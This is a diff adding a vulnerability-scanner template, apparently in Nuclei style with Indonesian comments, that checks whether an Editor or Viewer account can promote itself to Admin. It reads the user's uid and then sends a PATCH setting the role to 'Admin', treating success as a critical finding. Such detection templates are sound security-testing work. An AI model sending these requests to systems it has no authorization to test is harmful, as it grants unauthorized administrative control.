@@ -1,0 +1,43 @@
+id: editor-self-escalate-to-admin
+info:
+  name: "Editor (atau Viewer) dapat eskalasi hak istimewa menjadi Admin"
+  severity: "critical"
+target: "host" # Akan berjalan di host yang kita tentukan
+requests:
+  # REQUEST 1: Dapatkan UID pengguna saat ini
+  # Endpoint ini diizinkan untuk semua pengguna yang login
+  - method: "GET"
+    path: "{{base_url}}/api/user"
+    
+    matchers:
+      # Pastikan kita berhasil mendapatkan data pengguna
+      - type: "status"
+        status: 200
+        
+    extractors:
+      # Ekstrak "uid" dari respons JSON
+      # Contoh: {"id":4,"uid":"bf3ij41s8hiiod","email":"editor@localhost",...}
+      - type: "json"
+        jsonpath: "uid"
+        name: "user_uid" # Simpan sebagai variabel {{user_uid}}
+
+  # REQUEST 2: Gunakan UID untuk mencoba mengubah peran diri sendiri
+  # Endpoint ini seharusnya HANYA bisa diakses oleh Admin
+  - method: "PATCH"
+    # Gunakan variabel {{user_uid}} dari request pertama
+    path: "{{base_url}}/api/orgs/1/users/{{user_uid}}"
+    
+    # Body JSON untuk mengubah peran menjadi "Admin"
+    body: '{"role":"Admin"}'
+    
+    matchers_condition: "and"
+    matchers:
+      # 1. Kita mencari respons SUKSES (seharusnya 403 Forbidden)
+      - type: "status"
+        status: 200
+        
+      # 2. DAN kita pastikan server mengonfirmasi perubahan
+      - type: "word"
+        part: "body"
+        words:
+          - '"message":"Organization user updated"'
